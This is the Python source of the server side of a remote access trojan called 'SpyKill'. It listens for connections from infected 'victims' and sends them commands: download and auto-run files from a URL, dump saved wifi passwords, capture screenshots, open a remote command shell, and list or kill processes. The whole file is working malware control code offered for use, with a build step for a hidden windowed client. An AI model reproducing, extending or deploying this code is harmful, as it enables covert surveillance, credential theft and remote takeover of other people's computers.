from asyncio.windows_events import NULL
from glob import glob
import json
import this
import time
from os import system
import os
import socket 
import threading
from datetime import datetime



#TODO
"""
System Detection user/Server/
 USB DUMP FILES


File exp
 *up&dow
build
 *pyinstaller



"""



LPORT = 1177
spl = "[R]"  #split data
spy_version = '1.0'

primary_path = os.path.dirname(os.path.abspath(__file__))
_Format = "utf-8"  # data format
_Header = 64




start_time = NULL   #Stopwatch

list_ip = []
clients = []

c_stop = False
cap = False
cap_cmd = False



class _Build:
    def __init__(self, host, port):
        self.host = host
        self.port = port
    
    def checkme():
        try:   
            from cmath import exp
            import pyautogui
            import socket
            import threading
            import os
            import time
            import urllib.request
            import sys
            import wmi
            import platform,re,uuid,json,psutil,logging
            from urllib3 import Retry
            import subprocess
            from datetime import datetime
            import shutil
            import re
            import requests
            import win32file
            return True
        except:
            return False
    def build(): #            
        if this.checkme() == False:
            print('[-] Install requirements lib using setup.bat')
        else:
            print('[+] All package installed.')

#build
"""


os.system('pyinstaller --noconfirm --onefile --windowed --icon "' + icon + '"  "nclient.py"')
os.system('powershell -c cd dist; cp nclient.exe ..')

b1 = _Build("127.0.0.1", 1177)
"""



def s_title(x):
    system(f"title {x}")

s_title(f"SpyKill v {spy_version}")


def _display():
    print(f"""
  ____                    _  __  _   _   _ 
 / ___|   _ __    _   _  | |/ / (_) | | | |
 \___ \  | '_ \  | | | | | ' /  | | | | | |
  ___) | | |_) | | |_| | | . \  | | | | | |
 |____/  | .__/   \__, | |_|\_\ |_| |_| |_|
         |_|      |___/ github.com/imhamzaoui 
 v{spy_version}         
    """)

def s_state():
    global c_stop
    k = f'[+] Listening to port {LPORT} ...' if c_stop!=True else f'[-] Listening is not started yet!'
    print(f"""
    -SPY State
    {k}

    """)
def s_me():
    xp = socket.gethostbyname (socket.gethostname())
   
    print(f"""
     -SPYKILL v{spy_version}
       -IP ADD : [{xp}]
       -PORT   : [{LPORT}]
    """)
def _help():
    print("""
     [CODED WITH♥ BY HAMZAOUI   https://github.com/imhamzaoui]
     [SPYKILL] [@HOME] 
          * <spy> <start>  : Start Listening
          * <spy> <state>  : Get Spykill state
          * <set> <LPORT>  : Set Listening port
                -Exmp : set LPORT 1177
          * <list>         : Show List Of Victims
          * <select>       : Select Victim      
          * <cls> <clear>  : Clear terminal
          * <exit>         : Close all connection And exit

     [Target] [SELECT]
          * <back>           : Back To @HOME
          * <do> <url>       : Download and Auto Open File
                               -Exmp :  do https://@@@@@@
          * <url> <url>      : Open URL
                               -Exmp : url https://@@@@@@
          * <sys>            : Get System Info
          * <wifi>           : Dump wifi passwords
          * <cap>            : Get Screenshot
          * <cmd>            : Open cmd session
          * <pross>          : Get process List
            <kill> <pid>     : Kill process by pid
                               -Exmp : kill 3150
            <kill> <x,x,x>   : Kill process by pid list 
                               -Exmp : kill 3150,8000,200   
          * <getip>          : Get externel ip      
    
    """)
def cls():  #clear terminal
    os.system('cls' if os.name=='nt' else 'clear')

def time_convert(sec):
    mins = sec // 60
    sec = sec % 60
    mins = mins % 60
    #print("Time Lapsed = {0}:{1}".format(int(mins), round(sec, 2)))
    return ("**Data Recived in = [{0} : {1}] Min".format(int(mins), round(sec, 2)))

def watch_start():
    global start_time
    start_time = time.time()
def watch_stop():
    global start_time
    end_time = time.time()
    time_lapsed = end_time - start_time
    return(time_convert(time_lapsed))


def L_print(d,iplist): # print list of victims
    if len(iplist)!=0:
        print ("\n{:<8} {:<15}".format('ID','IP address'))
        k=0
        nip = []
        for h in iplist:
            nip.append(h[0])
        for i in nip:
            d.append([k,i])
            k+=1
        for v in d:
            name, age = v
            print ("{:<8} {:<15}".format( name, age)+"\n")
    else:
        print('No Victim Connect!')

def upload_file(c, file_name):
    f = open(file_name, 'rb')
    c.send(f.read())

def download_file(c, file_name):
    f = open(file_name, 'wb')
    c.settimeout(1)
    data = c.recv(1024)
    while data:
        f.write(data)
        try:
            data = c.recv(1024)
        except socket.timeout as e:
            break
    c.settimeout(None)
    f.close()

def sk(txt):  #retrun text with splite
    return txt+spl


def read(c):
    
    while 1:
        try:

            msg_len = c.recv(_Header).decode(_Format)      
            x_data = NULL
            if msg_len:
                msg_len = int(msg_len)


                x_data = c.recv(msg_len).decode(_Format)
           
            if x_data:
                return x_data
                
            else:
                break   
            #data = c.recv(1024).decode()
            
            
        except ValueError as a:
            print(str(a))
    
def send(msg,client):
    global cap
    try:
        client.send(msg.encode())
        cap = True
    except ValueError:
            print('err 0')

def connect(c,ip):
   
    while True:
        global cap
        global cap_cmd

        if cap_cmd:
            cm = str(input('ms-command @'+str(ip)+'(CMD) : '))
        
            if cm == 'cmd':
                cap_cmd = False
            else:
                send('cmd'+spl+cm,c) 

               
        else:
            cm = str(input('ms-command @'+str(ip)+' : '))
      
            if cm == 'back':
                break
            
            elif cm == "usb":
                send('usb',c)
            elif cm == "wifi":
                send('wifi',c)
            elif cm == "pross":
                print('[GET-process] Loading ...')
                watch_start()
                send('pross',c)
            elif cm[:3] == "url":  #open url
                send('url'+spl+str(cm[4:]),c)
            elif cm[:2] == "do":  #download and auto open file 
                send('do'+spl+str(cm[3:]),c)
            elif cm[:4] == "kill":
                #print('kill'+spl+str(cm[5:]))
                send('kill'+spl+str(cm[5:]),c)
            elif cm == 'sys':
                send('sysinfo',c)            
            elif cm == 'getip':
                send('getip',c)
            elif cm == 'cap':
                send('cap',c)
            elif cm == 'cmd':
                if cap_cmd == False:
                    cap_cmd = True
            elif cm == 'close':
                send('closed',c)
                cap = False
                clients.remove(c)
                list_ip.remove(ip)
                break
            elif cm == 'cls' or cm == 'clear':
                cls()
            elif cm == '-h' or cm == 'help':
                _help()
                      
           
        #else:
            #print('Commande not found')      
        if cap:
            while 1:
                op = str(read(c))
            
                da = op.split('[R]')
        
                if da[0] == "sysinfo":           
                    js = json.loads(da[1])
                    print(f"""
                    Platform         : {js["platform"]}
                    Platform-release : {js["platform-release"]}
                    Platform-version : {js["platform-version"]}
                    Architecture     : {js["architecture"]}
                    Hostname         : {js["hostname"]}
                    Ip-address       : {js["ip-address"]}
                    Mac-address      : {js["mac-address"]}
                    Processor        : {js["processor"]}
                    Ram              : {js["ram"]}
                    """)
                    break
                        
                
                elif da[0] == "info":
                    if (da[1]!='last'):
                        print(f'[INFO] {da[1]}')
                    else:
                        break
                
                elif da[0] == "usb":
                    print(da[1])
                    break
                elif da[0] == "url":
                    print(da[1])
                    break
                elif da[0] == "do":
                    print(da[1])
                    break
                elif da[0] == "pross":
                    print(da[1])
                    print(watch_stop())
                    break
                elif da[0] == "wifi":
                    print(da[1])
                    break
                elif da[0] == "cmd":
                    ka = da[1]
                    print(ka)
                    break
                elif da[0] == 'getip':
                    print(da[1])
                    break
                elif da[0] == 'kill':
                    print(da[1])
                    break
                elif da[0] == 'prs':
                    if da[1] != 'stop':
                        
                        print(da[1])
                    else:
                       
                        break
              
                elif da[0] == 'ERR':
                    print(f"[ERR]{da[1]}")
                elif da[0]=='cap': 
                    p = primary_path+'\\cap\\'+da[1]+'.jpg'
                    print('[SCREENSHOT] Loading ...')
                    download_file(c,primary_path+'//cap//'+da[1]+'.jpg')
                    print(f'Screenshot saved to : {p}')
                    break
                
                    
            cap = False
         

def accp():
    global c_stop

    while True:
       
        if c_stop:
            #s.close()
           
            break
        conn, addr = s.accept()
        clients.append(conn)
        list_ip.append(addr)
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        print(f"[+][{current_time}] {addr} Connected .\nspykill>> ", end='')



cls()   #First of all clear console
_display()




def s_stop():  #stop listening 
    global c_stop
    global s
    c_stop = True
    s.close()

    print(" [-]SPYKILL  Listening Stoped")
    
    
    

#ADD 


t=threading.Thread(target=accp)


def s_start(): #start listening 
    global c_stop
    global s

    c_stop = False

    s = socket.gethostbyname (socket.gethostname())   
    ADDR = (s,LPORT)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)



    
    s.bind(ADDR)
    s.listen()

    print(" [+]SPYKILL  Listening Started ...")

    
    t.start()
    

s_start()   #Start listning


while True:
    cm = input("spykill>> ")
    if cm == 'list':

  
        L_print([],list_ip)

       # for p in range(0,len(list_ip)):       #this old print
           # print("   ["+str(p)+"] ["+str(list_ip[p])+"] ")


    elif (cm == 'spy'):
        s_me()
    
    

    elif (cm[:3] == 'spy'):
        if (cm[4:]=='start'):  #start listning
            s_start()
        elif (cm[4:]=='stop'):
            #s_stop()
            c_stop = True
            s.close()
        elif (cm[4:]=='state'):
            s_state()


    elif (cm[:3] == 'set'):
        k = cm[4:]
        if k[:5] == 'LPORT':
            LPORT = k[6:]
            print(f'[LPORT]:[{LPORT}]')
    elif cm[:6] == 'select':    #select 0
            if cm[6:] !='':
                if int(cm[6:]) >=0:
                    print('Connect to '+str(list_ip[int(cm[6:])]))
                    connect(clients[int(cm[6:])],list_ip[int(cm[6:])])
                else:
                    print('invalide id')
       
    elif cm =='cls' or cm == 'clear':
        cls()    
    
    elif cm =='help' or cm == '-h':
        _help()   
    elif cm == 'exit':
        c_stop = True
        for c in clients:
            send('close',c)
            c.close()
        s.close()
        t.join()
        os.system('exit')
        break
